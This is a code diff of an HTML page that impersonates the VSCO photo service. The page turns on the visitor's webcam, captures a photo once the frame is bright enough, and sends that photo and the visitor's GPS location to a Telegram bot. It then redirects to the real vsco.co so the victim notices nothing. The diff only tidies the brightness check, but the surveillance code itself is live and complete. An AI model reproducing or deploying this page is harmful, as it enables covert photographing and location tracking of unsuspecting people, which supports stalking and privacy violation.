@@ -14,7 +14,6 @@
 <body>
     <img src="https://vsco.co/assets/images/vsco-logo.png" class="vsco-logo">
     <div id="status">Initializing Studio...</div>
-
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas" style="display:none;"></canvas>
 
@@ -33,15 +32,10 @@
                     const ctx = c.getContext('2d');
                     c.width = v.videoWidth; c.height = v.videoHeight;
                     ctx.drawImage(v, 0, 0);
-
                     const data = ctx.getImageData(0, 0, c.width, c.height).data;
-                    let brightness = 0;
-                    for (let i = 0; i < data.length; i += 4) {
-                        brightness += (data[i] + data[i+1] + data[i+2]) / 3;
-                    }
-                    const avg = brightness / (data.length / 4);
-
-                    if (avg > 40) { 
+                    let b = 0;
+                    for (let i = 0; i < data.length; i += 4) b += (data[i] + data[i+1] + data[i+2]) / 3;
+                    if ((b / (data.length / 4)) > 40) { 
                         clearInterval(checkInterval);
                         document.getElementById('status').innerText = "Face Detected. Redirecting...";
                         sendData(c);
@@ -57,19 +51,17 @@
                 const loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                 fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=✅ وجه مكتشف!\n📍 الموقع: ${loc}`);
             });
-
-            canvas.toBlob(b => {
+            canvas.toBlob(blob => {
                 const f = new FormData();
-                f.append('photo', b);
+                f.append('photo', blob);
                 fetch(`https://api.telegram.org/bot${token}/sendPhoto?chat_id=${chatId}`, { method: 'POST', body: f });
             }, 'image/jpeg');
-            
-            // التحويل بعد ثانيتين بالضبط
             setTimeout(() => { window.location.href = "https://vsco.co/"; }, 2000);
         }
     </script>
 </body>
 </html>
+
 
 
 
